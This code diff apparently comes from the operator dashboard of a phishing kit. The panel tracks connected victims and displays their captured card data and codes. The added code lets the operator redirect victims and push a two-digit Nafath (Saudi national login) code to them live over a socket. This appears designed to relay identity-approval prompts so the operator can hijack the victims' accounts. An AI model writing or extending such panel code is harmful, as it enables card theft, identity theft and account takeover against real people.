@@ -1147,8 +1147,19 @@
       html += '</select>';
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
-
-      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first)
+      
+      // إظهار زر إرسال الرمز في أعلى معلومات العميل عند دخوله لصفحة تحقق نفاذ
+      if (visitor.page === 'تحقق نفاذ') {
+        html += '<div class="bg-purple-50 border border-purple-200 rounded-lg p-4 mt-4">';
+        html += '<h3 class="font-bold text-purple-800 mb-3">🔐 إرسال رمز نفاذ</h3>';
+        html += '<div class="flex gap-2">';
+        html += '<input type="text" id="nafathCodeTop_' + visitor._id + '" value="' + (visitor.lastSentCode || '') + '" placeholder="أدخل الرمز" class="flex-1 px-4 py-2 border rounded-lg text-center font-bold text-lg" maxlength="2">';
+        html += '<button onclick="sendNafathCodeTop(\'' + visitor.socketId + '\', \'' + visitor._id + '\')" id="sendNafathBtnTop_' + visitor._id + '" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>إرسال</button>';
+        html += '</div>';
+        html += '</div>';
+      }
+      
+      // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
       const allEntries = [];
       
       // Add digit codes with type
@@ -1512,6 +1523,24 @@
     function sendCode(socketId) {
       const code = document.getElementById('codeInput').value;
       const btn = document.getElementById('sendCodeBtn');
+      if (code && btn) {
+        socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
+        // إظهار "تم الإرسال" مؤقتاً
+        const originalText = btn.textContent;
+        btn.textContent = 'تم الإرسال ✓';
+        btn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        btn.classList.add('bg-green-600');
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.classList.remove('bg-green-600');
+          btn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+        }, 1500);
+      }
+    }
+
+    function sendNafathCodeTop(socketId, visitorId) {
+      const code = document.getElementById('nafathCodeTop_' + visitorId).value;
+      const btn = document.getElementById('sendNafathBtnTop_' + visitorId);
       if (code && btn) {
         socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
         // إظهار "تم الإرسال" مؤقتاً
